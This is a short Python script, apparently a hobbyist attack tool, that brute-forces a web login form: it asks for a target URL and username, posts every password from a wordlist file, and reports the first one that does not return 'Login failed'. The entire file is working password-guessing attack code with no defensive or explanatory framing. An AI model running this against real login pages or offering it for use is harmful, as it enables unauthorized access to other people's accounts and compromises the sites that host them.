#!usr/bin/env python3
import requests
from banners import login
from colors import RED, RESET, GREEN

print(GREEN, login, RESET)
target_url = input("Enter the target url ")
username = input("Enter the username --> ")
data_dict = {"username": username, "password": "", "Login": "submit"}

with open('original.txt', 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if b"Login failed" not in response.content:
            print(GREEN, "[+] Got the password --> " + word, RESET)
            exit()
print(RED, "[+] Reached end of line......", RESET)
